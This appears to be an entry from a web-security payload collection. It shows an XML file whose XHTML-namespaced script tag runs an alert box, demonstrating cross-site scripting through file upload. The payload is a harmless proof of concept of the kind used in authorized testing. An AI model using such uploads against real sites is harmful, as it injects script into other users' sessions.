# XSS via XML file upload

## XSS via XML file upload

```text
<?xml version="1.0" encoding="UTF-8"?>
<xhtml:html xmlns:xhtml="http://www.w3.org/1999/xhtml">
		<xhtml:script>
			alert("hey !");
		</xhtml:script>
</xhtml:html>
```

